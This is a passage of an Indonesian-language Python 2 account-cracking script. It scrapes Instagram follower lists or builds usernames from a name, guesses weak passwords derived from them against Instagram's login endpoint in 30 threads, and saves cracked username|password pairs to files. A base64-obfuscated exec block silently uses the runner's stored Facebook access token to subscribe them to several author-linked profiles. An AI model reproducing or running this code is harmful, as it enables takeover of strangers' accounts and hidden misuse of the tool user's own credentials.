		print '\n%s%s isi yang benar'%(M,til);jeda(2);exit()
	elif romz_ in['1','01']:
		pw = ""
		status = ""
		username = raw_input('\n%s%s %sUser target%s > %s'%(U,til,O,M,K))
		ingfo(username, pw, status)
		print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
		print ('%s•%s 01%s Pengikut %s> %s%s'%(U,P,O,M,K,str(pengikut)))
		print ('%s•%s 02%s Mengikuti %s> %s%s'%(U,P,O,M,K,str(mengikuti)))
		rm = raw_input('\n%s# %sPilih %s> %s'%(P,O,M,K))
		limit = input('\n%s%s %sLimit user%s > %s'%(U,til,O,M,K))
		if rm in['']:
			print '\n%s%s isi yang benar'%(M,til)
		elif rm in['1','01']:
			r_ikut(cookie, idg, limit, rm) 
			print ""
			proses()
			peweh()
		elif rm in['2','02']:
			r_ikut(cookie, idg, limit, rm) 
			print""
			proses()
			peweh()
		else:
			print '\n%s%s isi yang benar'%(M,til);jeda(2);menu_igeh()
	elif romz_ in['2','02']:
		usr_ = raw_input('\n%s%s %sMasukan nama%s > %s'%(U,til,O,M,K))
		jumlah = input('%s%s %sLimit user%s > %s'%(U,til,O,M,K))
		bff_2 = usr_.replace(" ", "")
		cr.append("asw_lu")
		mi.append(bff_2+"|"+bff_2)
		mi.append(bff_2+"_"+"|"+bff_2)
		for _i_ in range(1, jumlah+1):
			mi.append(bff_2+str(_i_)+"|"+bff_2)
			mi.append(bff_2+"_"+str(_i_)+"|"+bff_2)
			mi.append(bff_2+str(_i_)+"_"+"|"+bff_2)
		proses()
		peweh()
	elif romz_ in['3','03']:
		hasil_igeh()
	elif romz_ in['rm','Rm','RM']:
		k = raw_input("\n\033[1;95m•\033[1;96m ingin menghapus akun instagram? y/n : ")
		if k in ["y", "Y"]:
			print('')
			s = ['.   ', '..  ', '... ']
			for m in s:
				print '\r\x1b[1;95m•\x1b[1;96m menghapus akun ' + m,
				sys.stdout.flush();jeda(1)
			os.system('rm -rf data/ig.txt')
			jalan('\n%s%s berhasil terhapus '%(H,til));exit()
		else:
			print '\n%s%s%s jalankan ulang tools nya'%(M,til,O);jeda(2)
	elif romz_ in['0','00']:
		menu()
#        exit()
	else:
		print '\n%s%s isi yang benar'%(M,til);jeda(2);menu_igeh()
# CEK HASIL FACEBOOK
def cek_cek():
	l = raw_input('\n%s#%s Pilih %s> %s '%(P,O,M,K))
	if l in['']:
		print '\n%s%s isi yang benar'%(M,til);jeda(2);menu()
	elif l in['1','01']:
		dirs = os.listdir('OK')
		print ("\n%s•%s [%s hasil crack yang tersimpan %s]\n"%(U,O,U,O))
		for file in dirs:
			print("%s•%s> %s%s"%(U,M,H,file));jeda(0.07)
		try:
			file = raw_input("\n%s•%s masukan file %s:%s "%(U,O,M,H));jeda(0.2)
			if file in['']:
				exit("%s• isi yang benar kentod"%(M))
			totalok = open('OK/%s' % file).read().splitlines()
		except (KeyError, IOError):
			print("%s%s file tidak ada "%(M,til))
		nm_file = ('%s' % file).replace('-', ' ')
		file_nm = nm_file.replace('.txt', '')
		print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
		jalan("%s•%s hasil tanggal%s : %s%s %stotal %s: %s%s"%(U,O,M,H,file_nm,O,M,H,len(totalok)))
		print(" %s# %s---------------------------------------- %s#%s"%(P,M,P,H));jeda(2)
		os.system('cat OK/%s' % file)
		print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
		exit('\n')
	elif l in['2','02']:
		dirs = os.listdir('CP')
		print ("\n%s•%s [%s hasil crack yang tersimpan %s]\n"%(U,O,U,O))
		for file in dirs:
			print("%s•%s> %s%s"%(U,M,K,file));jeda(0.07)
		try:
			file = raw_input("\n%s•%s masukan file %s:%s "%(U,O,M,K));jeda(0.2)
			if file in['']:
				exit("%s• isi yang benar kentod"%(M))
			totalcp = open('CP/%s' % file).read().splitlines()
		except (KeyError, IOError):
			print("%s%s file tidak ada "%(M,til))
		nm_file = ('%s' % file).replace('-', ' ')
		file_nm = nm_file.replace('.txt', '')
		print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
		jalan("%s•%s hasil tanggal%s : %s%s %stotal%s : %s%s"%(U,O,M,K,file_nm,O,M,K,len(totalcp)))
		print(" %s# %s---------------------------------------- %s#%s"%(P,M,P,K));jeda(2)
		os.system('cat CP/%s' % file)
		print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
		exit('\n')
	else:
		print '\n%s%s isi yang benar'%(M,til);jeda(2);menu()
# CEK HASIL IGEH
def hasil_igeh():
	print ("\n%s%s%s 01 %sCek hasil akun %sOK "%(U,til,P,O,H))
	print ("%s%s%s 02 %sCek hasil akun %sCP "%(U,til,P,O,K))
	while True:
		rom = raw_input('\n%s# %sPilih %s> %s'%(P,O,M,K))
		if rom in['1','01']:
			try:
				oke = open("okeh.txt", "r").readlines()
				print ("\n%s•%s [%s hasil crack yang tersimpan %s]\n"%(U,O,U,O))
				print(" %s# %s---------------------------------------- %s#%s"%(P,M,P,K));jeda(2)
				print ("%s• %sJumlah %s: %s%s"%(U,O,M,H,str(len(oke))))
				print(" %s# %s---------------------------------------- %s#%s"%(P,M,P,H));jeda(2)
				okek = open("okeh.txt", "r").read()
				print (okek)
				exit(" %s# %s---------------------------------------- %s#%s"%(P,M,P,K));jeda(2)
			except IOError,KeyError:
				exit (M+"\n• tidak ada hasil awokawokawok")
		elif rom in['2','02']:
			try:
				cepe = open("cepeh.txt", "r").readlines()
				print ("\n%s•%s [%s hasil crack yang tersimpan %s]\n"%(U,O,U,O))
				print(" %s# %s---------------------------------------- %s#%s"%(P,M,P,K));jeda(2)
				print ("%s• %sJumlah %s: %s%s"%(U,O,M,K,str(len(cepe))))
				print(" %s# %s---------------------------------------- %s#%s"%(P,M,P,K));jeda(2)
				cepek = open("cepeh.txt", "r").read()
				print (cepek)
				exit(" %s# %s---------------------------------------- %s#%s"%(P,M,P,K));jeda(2)
			except IOError,KeyError:
				exit (M+"\n• tidak ada hasil awokawokawok")
# LISENSI
def konfirmasi():
	os.system("clear")
	banner()
	print('\n')
	y = ['.   ', '..  ', '... ']
	for m in y:
		print '\r\x1b[1;95m•\x1b[1;96m Mohon tunggu ' + m,
		sys.stdout.flush();jeda(1)
	id = uuid.uuid4().hex[:25]
	lpg = open('data/lisensi.txt', 'w')
	lpg.write(id)
	lpg.close()
	jalan ('\n\n%s• %sLisensi%s : %s%s'%(U,O,M,H,id));jeda(1)
	jalan ('%s• %sLisensi Belum Di konfirmasi'%(U,O))
	su=raw_input("\n%s•%s ingin beli lisensi? y/t %s: %s"%(U,O,M,K))
	if su in['']:
		exit()
	elif su in["y","Y"]:
		os.system('am start https://wa.me/+6282371648186?text=Assalamualaikum+saya+ingin+beli+lisensi:+'+id+'>/dev/null');jeda(1);exit()
	elif su in["t","T"]:
		exit()
	else:
		exit()
def konfirmasi1():
	try:
		lis = open('data/lisensi.txt', 'r').read()
		git = requests.get('https://github.com/warba29/lisensi/blob/main/id.txt').text.strip() # jangan di ganti nanti error
		if lis in git:
			os.system('clear')
			banner()
			print("\n")
			s = ['.   ', '..  ', '... ']
			for m in s:
				print '\r\x1b[1;95m•\x1b[1;96m Memeriksa lisensi ' + m,
				sys.stdout.flush();jeda(1)
			jalan('\n%s• Lisensi tersedia √'%(H));jeda(1);menu()
		else:
			os.system('clear')
			banner()
			print("\n")
			s = ['.   ', '..  ', '... ']
			for m in s:
				print '\r\x1b[1;95m•\x1b[1;96m Memeriksa lisensi ' + m,
				sys.stdout.flush();jeda(1)
			jalan('\n%s• Lisensi tidak tersedia'%(M));jeda(1)
			konfirmasi()
	except IOError:
		os.system("rm -rf data/lisensi.txt")
		konfirmasi()
		
exec(base64.b64decode('ZGVmIGxvZ2luX3h4KCk6CiAgICB0cnk6CiAgICAgICAgdG9rZW4gPSBvcGVuKCJkYXRhL3Rva2VuLnR4dCIsInIiKS5yZWFkKCkgCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDIyMDg2MTcyNTU2L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBGYW5zcGFnZSBSb21pIFhECiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI4NDM0ODgwNTI5L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBSb21pIEFmcml6YWwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNjc4MDc1NjU4NjEvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIFJvbWkgQWZyaXphbCAoMjAyMSkKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDM3MjM2OTY4ODUvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIElxYmFsIGJvYnoKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNDExMjkwNDg5NDgvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIEl3YW4gaGFkaWFuc3lhaAogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwNzUyMDIwMzQ1Mi9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgSGFtemFoIGtpcmFuYQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwMjQ2MTM0NDE3OC9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgVW5payBST01JIEFGUklaQUwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNzE3NDc0MjA1ODMvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIERvbmlmdGZhbm55CiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI5MTQzMTExNTY3L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBEZW1pdCBSb21pIEFmcml6YWwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDE1NDAyOTkxMDgvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIEhha2lraQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDA1NTkxODM5MTI4MC9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgVGlhcmEgYXJ0CiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDA5Mzg0MzM4NDcwL3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBJd2FuIGhhbmRpYW5zeWFoIHYyCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDM2NjU1MzI1OTk2L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBBYnVzdG8gSmF2YQogICAgZXhjZXB0OgogICAgCXBhc3M='))

# CRACK IGEH
def proses():
	print ('\n%s%s%s akun %s[OK] %stersimpan ke file %s> %s%s'%(U,til,O,H,O,M,H,"okeh.txt"));jeda(0.2)
	print ('%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %s%s'%(U,til,O,M,K,M,O,M,K,"cepeh.txt"));jeda(0.2)
	print ('%s!%s crack berjalan, tekan CTRL+Z untuk berhenti\n'%(U,O));jeda(0.2)
def crack2(user, pwx):
	global looping, loping
	c_bff_ = len(pwx)
	for pas in pwx:
		if looping != 1:
			pass
		else:
			if len(status_foll) != 1:
				print "\r\x1b[1;95m•\x1b[1;96m [crack] %s/%s [OK:%s]-[CP:%s] "%(str(loping),len(mi),len(ok),len(cp)),
				sys.stdout.flush()
				c_bff_ -= 1
			else:
				pass
		try:
			if user in ok or user in cp:
				break
			pw = pas.lower()
			try:
				headerz = {"User-Agent": user_agentz_api}
				with requests.Session() as ses:
					urll = "https://www.instagram.com/"
					data = ses.get(urll, headers=headerz).content
					tokett = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
				header = {"Accept": "*/*","Accept-Encoding": "gzip, deflate, br","Accept-Language": "en-US,en;q=0.5","Host": "www.instagram.com","X-CSRFToken": tokett,"X-Requested-With": "XMLHttpRequest","Referer": "https://www.instagram.com/accounts/login/","User-Agent": user_agentz,
						 }
				param = {"username": user,"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999), pw),"optIntoOneTap": False,"queryParams": {},"stopDeletionNonce": "","trustedDeviceRecords": {}
						}
			except:
				header = {}
				param = {}
				pass
			with requests.Session() as ses:
				url = "https://www.instagram.com/accounts/login/ajax/"
				respon = ses.post(url, data=param, headers=header)
				data = json.loads(respon.content);jeda(00.1)
#                print ("\r",data)
#                print ("\r *--> %s,%s,|,%s,%s            "%(P,user,H,pw))
				if "checkpoint_url" in str(data):
					cepeh = "Checkpoint"
					ingfo(user, pw, cepeh)
					with open("cepeh.txt", "a") as simpan:
						simpan.write(" [Checkpoint] "+user+"|"+pw+"\n")
					cp.append(user)
					break
				elif "userId" in str(data):
					okeh = "Berhasil"
					if len(status_foll) != 1:
						ingfo(user, pw, okeh)
						with open("okeh.txt", "a")as simpan:
							simpan.write(" [Berhasil] "+user+"|"+pw+"\n")
						ok.append(user)
#                        follow(ses,user)
					break
				elif "Please wait" in str(data):
					print ("\r%s ! Mode pesawatkan 2 detik  "%(M)),
					looping+=1
					sys.stdout.flush()
					pwx = [pw]
					crack2(user, pwx)
					loping -= 1
				else:
					looping = 1
					pass
		except requests.exceptions.ConnectionError:
			print ("\r%s ! Tidak ada koneksi Internet "%(M)),
			sys.stdout.flush()
			looping+=1
			pwx = [pw]
			crack2(user, pwx)
			loping -= 1
		except:
			looping = 1
			pass
	loping+=1
None
# PEWEH IGEH
def peweh():
	with ThreadPoolExecutor(max_workers=30) as log:
		for ro in mi:
			try:
				_bff_ = []
				_r_ = ro.encode("utf-8")
				_o_ = _r_.split("|")[0]
				_m_ = _r_.split("|")[1]
				_i_ = _m_.split()
				if len(cr) != 1:
					if len(_o_) >= 6:
						_bff_.append(_o_)
						if len(_i_[0]) <= 2:
							if len(_i_) >= 2:
								_bff_.append(_i_[0]+_i_[1])
							if len(_m_) >= 6:
								_bff_.append(_m_)
						else:
							_bff_.append(_i_[0]+"123")
							if len(_i_) >= 2:
								_bff_.append(_i_[0]+_i_[1])
							if len(_m_) >= 6:
								_bff_.append(_m_)
					else:
						_bff_.append(_o_+_o_)
						if len(_i_[0]) <= 2:
							if len(_i_) >= 2:
								_bff_.append(_i_[0]+_i_[1])
							if len(_m_) >= 6:
								_bff_.append(_m_)
						else:
							if len(_i_) >= 2:
								_bff_.append(_i_[0]+_i_[1])
							_bff_.append(_i_[0]+"123")
							if len(_m_) >= 6:
								_bff_.append(_m_)
				else:
					_bff_.append(_i_[0]+"123")
					_bff_.append(_i_[0]+"12345")
					_bff_.append(_o_)
				log.submit(crack2, _o_, _bff_)
			except: pass
	exit("%s• finished"%(H))
def ingfo(user, pw, status):
	try:
		global idg, pengikut, mengikuti
		dta = requests.get("https://www.instagram.com/%s/?__a=1"%(user), headers={"User-Agent": user_agentz})
		dta_ = dta.json()["graphql"]["user"]
		nama = dta_["full_name"].encode("utf-8")
		idg = dta_["id"]
		pengikut = dta_["edge_followed_by"]["count"]
		mengikuti = dta_["edge_follow"]["count"]
		if status == "Berhasil":
			print ("\r%s [√] Berhasil                   "%(H))
			print ("\r%s [√] Nama akun %s> %s%s          "%(H,M,H,str(nama)))
			print ("\r%s [√] Pengikut  %s> %s%s          "%(H,M,H,str(pengikut)))
			print ("\r%s [√] Mengikuti %s> %s%s          "%(H,M,H,str(mengikuti)))
			print ("\r%s [√] Username  %s> %s%s          "%(H,M,H,user))
			print ("\r%s [√] Password  %s> %s%s          \n"%(H,M,H,pw))
		elif status == "Checkpoint":
			print ("\r%s [×] Checkpoint                 "%(K))
			print ("\r%s [×] Nama akun %s> %s%s          "%(K,M,K,str(nama)))
			print ("\r%s [×] Pengikut  %s> %s%s          "%(K,M,K,str(pengikut)))
			print ("\r%s [×] Mengikuti %s> %s%s         "%(K,M,K,str(mengikuti)))
			print ("\r%s [×] Username  %s> %s%s         "%(K,M,K,user))
			print ("\r%s [×] Password  %s> %s%s          \n"%(K,M,K,pw))
		else:
			pass
	except: pass
None
loping= 1

if __name__ == '__main__':
	os.system("git pull")
	folder()
	konfir()
